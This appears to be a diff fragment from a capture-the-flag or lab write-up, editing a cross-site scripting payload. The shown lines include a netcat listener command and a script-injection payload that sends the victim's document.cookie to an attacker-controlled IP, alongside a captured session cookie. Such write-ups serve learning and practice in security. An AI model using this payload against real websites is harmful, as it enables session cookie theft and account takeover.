@@ -203,7 +203,7 @@ Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 nc -lnvp 80 -k
 
 # inject the full xss payload 
-'><script>document.location="http://10.10.16.52:80/?c="+document.cookie;</script>
+"><script>document.location="http://10.10.16.52:80/?c="+document.cookie;</script>
 ```
 
 
